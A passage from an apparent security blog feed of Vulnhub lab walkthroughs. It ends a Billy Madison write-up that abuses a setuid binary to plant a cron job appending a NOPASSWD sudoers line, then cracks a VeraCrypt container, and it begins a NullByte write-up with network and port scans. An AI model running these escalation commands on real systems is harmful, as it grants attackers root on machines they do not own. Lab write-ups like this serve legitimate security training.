<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myTest/BillyMadison1.1# ssh &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#97;&amp;#105;&amp;#108;&amp;#116;&amp;#x6f;&amp;#58;&amp;#x65;&amp;#x72;&amp;#x69;&amp;#99;&amp;#64;&amp;#x31;&amp;#48;&amp;#x2e;&amp;#49;&amp;#x2e;&amp;#49;&amp;#x2e;&amp;#49;&amp;#x32;&amp;#57;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x65;&amp;#114;&amp;#105;&amp;#99;&amp;#64;&amp;#49;&amp;#48;&amp;#x2e;&amp;#49;&amp;#x2e;&amp;#x31;&amp;#x2e;&amp;#x31;&amp;#50;&amp;#57;&lt;/a&gt; -p 1974</span>
</span><span class='line'>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#x61;&amp;#x69;&amp;#x6c;&amp;#x74;&amp;#x6f;&amp;#x3a;&amp;#101;&amp;#114;&amp;#x69;&amp;#x63;&amp;#64;&amp;#x31;&amp;#48;&amp;#46;&amp;#x31;&amp;#x2e;&amp;#49;&amp;#x2e;&amp;#x31;&amp;#x32;&amp;#x39;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#101;&amp;#114;&amp;#105;&amp;#x63;&amp;#64;&amp;#x31;&amp;#48;&amp;#46;&amp;#x31;&amp;#46;&amp;#x31;&amp;#x2e;&amp;#49;&amp;#50;&amp;#57;&lt;/a&gt;&amp;rsquo;s password:</span>
</span><span class='line'>Welcome to Ubuntu 16.04.1 LTS <span class="o">(</span>GNU/Linux 4.4.0-36-generic x86_64<span class="o">)</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;ul&gt;
</span><span class='line'>&lt;li&gt;Documentation:  &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://help.ubuntu.com&quot;</span>&gt;https://help.ubuntu.com&lt;/a&gt;&lt;/li&gt;
</span><span class='line'>&lt;li&gt;Management:     &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://landscape.canonical.com&quot;</span>&gt;https://landscape.canonical.com&lt;/a&gt;&lt;/li&gt;
</span><span class='line'>&lt;li&gt;Support:        &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://ubuntu.com/advantage&quot;</span>&gt;https://ubuntu.com/advantage&lt;/a&gt;&lt;/li&gt;
</span><span class='line'>&lt;/ul&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;p&gt;37 packages can be updated.
</span><span class='line'><span class="m">0</span> updates are security updates.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Last login: Sat Aug <span class="m">20</span> 22:28:28 <span class="m">2016</span> from 192.168.3.101
</span><span class='line'>eric@BM:~<span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>eric<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>eric<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>eric<span class="o">)</span>
</span><span class='line'>eric@BM:~<span class="nv">$ </span><span class="nb">pwd</span>
</span><span class='line'>/home/eric
</span><span class='line'>eric@BM:~<span class="nv">$ </span>ls -la
</span><span class='line'>total 532
</span><span class='line'>drwxr-xr-x <span class="m">3</span> eric eric   <span class="m">4096</span> Aug <span class="m">23</span> 00:18 .
</span><span class='line'>drwxr-xr-x <span class="m">6</span> root root   <span class="m">4096</span> Aug <span class="m">20</span> 13:56 ..
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> eric eric    <span class="m">220</span> Aug <span class="m">20</span> 13:56 .bash_logout
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> eric eric   <span class="m">3771</span> Aug <span class="m">20</span> 13:56 .bashrc
</span><span class='line'>drwx<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span> <span class="m">2</span> eric eric   <span class="m">4096</span> Aug <span class="m">20</span> 14:07 .cache
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> root root <span class="m">451085</span> Aug  <span class="m">7</span> 22:31 eric-tongue-animated.gif
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> root root  <span class="m">60710</span> Aug  <span class="m">7</span> 22:29 eric-unimpressed.jpg
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> eric eric    <span class="m">655</span> Aug <span class="m">20</span> 13:56 .profile
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> root root    <span class="m">115</span> Aug <span class="m">20</span> 20:41 why-1974.txt
</span><span class='line'>eric@BM:~<span class="nv">$ </span>uname -a
</span><span class='line'>Linux BM 4.4.0-36-generic <span class="c">#55-Ubuntu SMP Thu Aug 11 18:01:55 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span>
</span><span class='line'>eric@BM:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Now I&rsquo;m in.</p>

<p>Then I did enumeration and preperation for rooting.</p>

<p>However, both <code>LinEnum.sh</code> and <code>linuxprivchecker.py</code> have not give me any positive suggestion to priv escalation.</p>

<p>Then I followed the g0tm1lk&rsquo;s <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" title="Basic Linux Privilege Escalation Guide">basic linux privilege escalation</a>, and found a program file which sticky bit is set.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>eric@BM:/etc/cron.hourly# find / -perm -g<span class="o">=</span>s -perm -u<span class="o">=</span>s -type f -ls 2&gt;/dev/null
</span><span class='line'>  <span class="m">1454477</span>    <span class="m">368</span> -r-sr-s<span class="p">&amp;</span>mdash<span class="p">;</span>   <span class="m">1</span> root     eric       <span class="m">372922</span> Aug <span class="m">20</span> 22:35 /usr/local/share/sgml/donpcgd
</span><span class='line'>  <span class="m">1058032</span>     <span class="m">52</span> -rwsr-sr-x   <span class="m">1</span> daemon   daemon      <span class="m">51464</span> Jan <span class="m">14</span>  <span class="m">2016</span> /usr/bin/at
</span></code></pre></td></tr></table></div></figure></p>

<p>By checking with the target program <font color="red"><code>/usr/local/share/sgml/donpcgd</code></font>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>eric@BM:~# /usr/local/share/sgml/donpcgd
</span><span class='line'>Usage: /usr/local/share/sgml/donpcgd path1 path2&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;eric@BM:~# /usr/local/share/sgml/donpcgd /etc/shadow /tmp/shadow&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h4&gt;mknod<span class="o">(</span>/tmp/shadow,81a0,0<span class="o">)</span>&lt;/h4&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;eric@BM:~# ls -al /tmp/shadow
</span><span class='line'>-rw-r<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> root shadow <span class="m">0</span> Jan  <span class="m">7</span> 04:55 /tmp/shadow
</span></code></pre></td></tr></table></div></figure></p>

<p>This program will copy the file in path1 to path2 (only name is same, but the content will not be copied. the new file is empty.)</p>

<p>so that means, I can create file to any location by taking advantage of this program.</p>

<p>Then I created a <code>cron.hourly</code> entry which including a bash script to add eric into the sudoers.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>eric@BM:~<span class="nv">$ </span>touch /tmp/rootme
</span><span class='line'>eric@BM:~<span class="nv">$ </span>/usr/local/share/sgml/donpcgd /tmp/rootme /etc/cron.hourly/rootme&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h4&gt;mknod<span class="o">(</span>/etc/cron.hourly/rootme,81b4,0<span class="o">)</span>&lt;/h4&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;eric@BM:~<span class="nv">$ </span><span class="nb">echo</span> -e <span class="p">&amp;</span>lsquo<span class="p">;</span><span class="c">#!/bin/bash\necho &amp;ldquo;eric ALL=(ALL) NOPASSWD:ALL&amp;rdquo; &gt;&gt; /etc/sudoers&amp;rsquo; &gt; /etc/cron.hourly/rootme</span>
</span><span class='line'>eric@BM:~<span class="nv">$ </span>chmod +x /etc/cron.hourly/rootme
</span><span class='line'>eric@BM:~<span class="nv">$ </span>cat /etc/cron.hourly/rootme&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;!/bin/bash&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;echo <span class="p">&amp;</span>ldquo<span class="p">;</span>eric <span class="nv">ALL</span><span class="o">=(</span>ALL<span class="o">)</span> NOPASSWD:ALL<span class="p">&amp;</span>rdquo<span class="p">;</span> &gt;&gt; /etc/sudoers
</span></code></pre></td></tr></table></div></figure></p>

<p>After 1 hour waiting, I try to check if the <code>rootme</code> is executed correctly by using command <code>sudo su</code>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>eric@BM:~<span class="nv">$ </span>sudo su
</span><span class='line'>root@BM:/home/eric# id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span><span class='line'>root@BM:/home/eric#
</span></code></pre></td></tr></table></div></figure></p>

<p>Great, now I am the root!!</p>

<p>Then found <code>hint.txt</code> and <code>BowelMovement</code> in folder <code>/PRIVATE</code>, downloaded these two files by using <code>nc</code>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@BM:/PRIVATE# cat hint.txt
</span><span class='line'>Heh, I called the file BowelMovement because it has the same initials as
</span><span class='line'>Billy Madison.  That truely cracks me up!  LOLOLOL!&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;I always forget the password, but it<span class="p">&amp;</span>rsquo<span class="p">;</span>s here:&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://en.wikipedia.org/wiki/Billy_Madison&quot;</span>&gt;https://en.wikipedia.org/wiki/Billy_Madison&lt;/a&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;-EG
</span></code></pre></td></tr></table></div></figure></p>

<p>From the link, I use <code>cewl</code> to generate a wordlist:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:/root/myTest/BillyMadison1.1# cewl <span class="p">&amp;</span>ndash<span class="p">;</span>depth <span class="m">0</span> -w billy-wiki.list &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://en.wikipedia.org/wiki/Billy_Madison&quot;</span>&gt;https://en.wikipedia.org/wiki/Billy_Madison&lt;/a&gt;
</span><span class='line'>CeWL 5.3 <span class="o">(</span>Heading Upwards<span class="o">)</span> Robin Wood <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#97;&amp;#x69;&amp;#108;&amp;#116;&amp;#x6f;&amp;#x3a;&amp;#114;&amp;#x6f;&amp;#98;&amp;#x69;&amp;#110;&amp;#64;&amp;#x64;&amp;#x69;&amp;#x67;&amp;#x69;&amp;#x2e;&amp;#x6e;&amp;#105;&amp;#x6e;&amp;#106;&amp;#97;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x72;&amp;#111;&amp;#x62;&amp;#105;&amp;#x6e;&amp;#x40;&amp;#x64;&amp;#x69;&amp;#103;&amp;#x69;&amp;#46;&amp;#110;&amp;#x69;&amp;#110;&amp;#106;&amp;#x61;&lt;/a&gt;) (&lt;a href=&quot;https://digi.ninja/&quot;&gt;https://digi.ninja/&lt;/a&gt;)</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Then using <code>truecrack</code> with wordlist to crack <code>BowelMovement</code>, the password is guessed successfully.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myTest/BillyMadison1.1# truecrack -w billy-wiki.list -t BowelMovement
</span><span class='line'>TrueCrack v3.0
</span><span class='line'>Website: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://code.google.com/p/truecrack&quot;</span>&gt;http://code.google.com/p/truecrack&lt;/a&gt;
</span><span class='line'>Contact us: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#97;&amp;#x69;&amp;#x6c;&amp;#116;&amp;#111;&amp;#58;&amp;#105;&amp;#x6e;&amp;#102;&amp;#x6f;&amp;#x74;&amp;#x72;&amp;#117;&amp;#x65;&amp;#x63;&amp;#114;&amp;#97;&amp;#x63;&amp;#x6b;&amp;#x40;&amp;#103;&amp;#109;&amp;#x61;&amp;#105;&amp;#x6c;&amp;#46;&amp;#x63;&amp;#x6f;&amp;#109;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x69;&amp;#110;&amp;#102;&amp;#111;&amp;#116;&amp;#x72;&amp;#117;&amp;#101;&amp;#x63;&amp;#x72;&amp;#97;&amp;#99;&amp;#107;&amp;#64;&amp;#103;&amp;#x6d;&amp;#x61;&amp;#105;&amp;#108;&amp;#46;&amp;#x63;&amp;#x6f;&amp;#x6d;&lt;/a&gt;</span>
</span><span class='line'>Found password:     <span class="p">&amp;</span>ldquo<span class="p">;</span>execrable<span class="p">&amp;</span>rdquo<span class="p">;</span>
</span><span class='line'>Password length:    <span class="p">&amp;</span>ldquo<span class="p">;</span>10<span class="p">&amp;</span>rdquo<span class="p">;</span>
</span><span class='line'>Total computations: <span class="p">&amp;</span>ldquo<span class="p">;</span>606<span class="p">&amp;</span>rdquo<span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Cool, then I downloaded and installed the tool <a href="https://veracrypt.codeplex.com/wikipage?title=Downloads" title="veracrypt"><code>veracrypt</code></a></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myTest/BillyMadison1.1# mkdir billy-vera
</span><span class='line'>root@kali:~/myTest/BillyMadison1.1# veracrypt -tc BowelMovement billy-vera&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;root@kali:~/myTest/BillyMadison1.1# <span class="nb">cd </span>billy-vera/
</span><span class='line'>root@kali:~/myTest/BillyMadison1.1/billy-vera# ls
</span><span class='line'><span class="nv">$RECYCLE</span>.BIN  secret.zip
</span><span class='line'>root@kali:~/myTest/BillyMadison1.1/billy-vera# unzip secret.zip
</span><span class='line'>Archive:  secret.zip
</span><span class='line'>  inflating: Billy_Madison_12th_Grade_Final_Project.doc&lt;br/&gt;
</span><span class='line'>  inflating: THE-END.txt           &lt;br/&gt;
</span><span class='line'>root@kali:~/myTest/BillyMadison1.1/billy-vera# ls
</span><span class='line'>Billy_Madison_12th_Grade_Final_Project.doc  <span class="nv">$RECYCLE</span>.BIN  secret.zip  THE-END.txt
</span><span class='line'><span class="nb">exit</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;root@kali:~/myTest/BillyMadison1.1/billy-vera# cat THE-END.txt
</span><span class='line'>Congratulations!&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;If you<span class="p">&amp;</span>rsquo<span class="p">;</span>re reading this, you win!&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;I hope you had fun.  I had an absolute blast putting this together.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;I<span class="p">&amp;</span>rsquo<span class="p">;</span>d love to have your feedback on the box - or at least know you pwned it!&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Please feel free to shoot me a tweet or email <span class="o">(</span>7&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#x61;&amp;#x69;&amp;#x6c;&amp;#x74;&amp;#111;&amp;#58;&amp;#x6d;&amp;#x73;&amp;#64;&amp;#x37;&amp;#x6d;&amp;#115;&amp;#46;&amp;#x75;&amp;#x73;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x6d;&amp;#115;&amp;#x40;&amp;#55;&amp;#109;&amp;#x73;&amp;#46;&amp;#117;&amp;#115;&lt;/a&gt;) and let me know with</span>
</span><span class='line'>the subject line: <span class="p">&amp;</span>ldquo<span class="p">;</span>Stop looking at me swan!<span class="p">&amp;</span>rdquo<span class="p">;</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Thanks much,&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Brian Johnson
</span><span class='line'><span class="m">7</span> Minute Security
</span><span class='line'>www.7ms.us
</span></code></pre></td></tr></table></div></figure></p>

<p>Done.</p>

<!--- Reference -->



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[Vulnhub]NullByte: 1]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/08/18/vulnhub-nullbyte-1/"/>
    <updated>2015-08-18T09:12:46-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/08/18/vulnhub-nullbyte-1</id>
    <content type="html"><![CDATA[<p><strong>NullByte challenge 0x01</strong></p>

<p>Difficulty is Basic to intermediate.</p>

<p>&ldquo;Use your lateral thinking skills, maybe youâll need to write some code.&rdquo; &ndash; <a href="http://ly0n.me/2015/08/01/nullbyte-challenge-0x01/">ly0n</a></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/nullbyte-1,126/">here</a>.</p>

<!-- more -->


<p><img class="left" src="/downloads/nullbyte1/main.png"></p>

<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali Linux (<em>10.10.10.130/24</em>)</p>

<p>Target: NullByte: 1 (<em>10.10.10.134/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>Found hidden information in picture and open the hidden path</li>
<li>Weak passwords used in Web login form, the password can be found by brute-force attacking</li>
<li>SQL injection vulnerability found in username searching page</li>
<li>Exploit SQL injection vulnerability to get user credentials, also can get a limited shell</li>
<li>Found user ramses with Base64 encoded MD5 password which can be cracked easily and SSH login as ramses</li>
<li>Mis-configuration program which has setuid set and did not use full path inside of system call. Exploit it to get ROOT</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">Net Discover</font>]</li>
<li>Port scanned the target to discover the running services and open ports [<font color="FF8000">unicornscan</font> &amp; <font color="FF8000">nmap</font>]</li>
<li>Web application vulnerability scanned to discover any web vulnerability [<font color="FF8000">nikto</font>]</li>
<li>Brute force scan to find hidden path [<font color="FF8000">dirb</font>]</li>
<li>Web information gathering and interacting with the web server [<font color="FF8000">firefox</font>]</li>
<li>Download picture from index.html and reveal the hidden information stored in it</li>
<li>Found the hidden folder and a login page which has comment saying that the password is simple</li>
<li>Use hydra with rockyou.txt to burte force crack the login password [<font color="FF8000">THC Hydra</font>]</li>
<li>The next username searching page is SQL injection vulnerable, exploit it to downlaod system sensitive file, login credentials and also get a limited shell [<font color="FF8000">sqlmap</font>]</li>
<li>Crack user ramses&rsquo;s password and ssh login to get a better shell</li>
<li>System enumeration and Exploit vulnerable program with setuid bit set to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://nixgeneration.com/~jaime/netdiscover/">netdiscover</a></li>
<li><a href="https://github.com/dneufeld/unicornscan">unicornscan</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="http://dirb.sourceforge.net/">dirb</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="http://sqlmap.org/">sqlmap</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using netdiscover as routine to detect the target&rsquo;s IP address (10.10.10.134 in this case).</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>F4l13n@kali:~$ sudo netdiscover -r 10.1.1.0/24
</span><span class='line'> Currently scanning: Finished!   |   Screen View: Unique Hosts&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p> 5 Captured ARP Req/Rep packets, from 5 hosts.   Total size: 300&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;hr />
</span><span class='line'>
</span><span class='line'>&lt;h2>   IP            At MAC Address      Count  Len   MAC Vendor                   &lt;/h2>
</span><span class='line'>
</span><span class='line'>&lt;p> 10.1.1.1        00:50:56:c0:00:08    01    060   VMWare, Inc.                                                                                                &lt;br/>
</span><span class='line'> 10.1.1.2        00:50:56:fd:d1:6b    01    060   VMWare, Inc.                                                                                                &lt;br/>
</span><span class='line'> 10.1.1.134      00:0c:29:e1:e0:98    01    060   VMware, Inc.                                                                                            &lt;br/>
</span><span class='line'> 10.1.1.254      00:50:56:ee:31:18    01    060   VMWare, Inc. &lt;br/></span></code></pre></td></tr></table></div></figure></p>

<p>10.10.10.134 is our Target!</p>

<p>Then run uniscornscan to detect opening ports on the target (unicornscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>F4l13n@kali:~$ sudo us -H -msf -Iv -p 1-65535 10.1.1.134
</span><span class='line'>listener statistics 147984 packets recieved 0 packets droped and 0 interface drops
</span><span class='line'>TCP open                http[   80]     from 10.1.1.134  ttl 64
</span><span class='line'>TCP open              sunrpc[  111]     from 10.1.1.134  ttl 64
</span><span class='line'>TCP open      multiling-http[  777]     from 10.1.1.134  ttl 64
</span><span class='line'>TCP open             unknown[32942]     from 10.1.1.134  ttl 64</span></code></pre></td></tr></table></div></figure></p>

<p>From the result above, TCP port 80, 111, 777 and 32942 have been discovered.</p>

<p>Then I run NMAP scan to probe more detail information for the four opening ports.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>Nmap 6.49BETA4 scan initiated Mon Aug 17 07:06:13 2015 as: nmap -v -sV -O -A -T4 -p 80,111,777,32942 -oN NullByte_nmap.txt 10.1.1.134&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>Nmap scan report for 10.1.1.134
</span><span class='line'>Host is up (0.00044s latency).
</span><span class='line'>PORT      STATE SERVICE VERSION
</span><span class='line'>80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
</span><span class='line'>|&lt;em>http-methods: GET HEAD POST OPTIONS
</span><span class='line'>|&lt;/em>http-server-header: Apache/2.4.10 (Debian)
</span><span class='line'>|&lt;em>http-title: Null Byte 00 - level 1
</span><span class='line'>111/tcp   open  rpcbind 2-4 (RPC #100000)
</span><span class='line'>| rpcinfo:
</span><span class='line'>|   program version   port/proto  service
</span><span class='line'>|   100000  2,3,4        111/tcp  rpcbind
</span><span class='line'>|   100000  2,3,4        111/udp  rpcbind
</span><span class='line'>|   100024  1          32942/tcp  status
</span><span class='line'>|&lt;/em>  100024  1          47213/udp  status
</span><span class='line'>777/tcp   open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
</span><span class='line'>| ssh-hostkey:
</span><span class='line'>|   1024 16:30:13:d9:d5:55:36:e8:1b:b7:d9:ba:55:2f:d7:44 (DSA)
</span><span class='line'>|   2048 29:aa:7d:2e:60:8b:a6:a1:c2:bd:7c:c8:bd:3c:f4:f2 (RSA)
</span><span class='line'>|_  256 60:06:e3:64:8f:8a:6f:a7:74:5a:8b:3f:e1:24:93:96 (ECDSA)
</span><span class='line'>32942/tcp open  status  1 (RPC #100024)
</span><span class='line'>MAC Address: 00:0C:29:E1:E0:98 (VMware)
</span><span class='line'>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
</span><span class='line'>Device type: general purpose
</span><span class='line'>Running: Linux 3.X
</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:3
</span><span class='line'>OS details: Linux 3.2 - 3.19
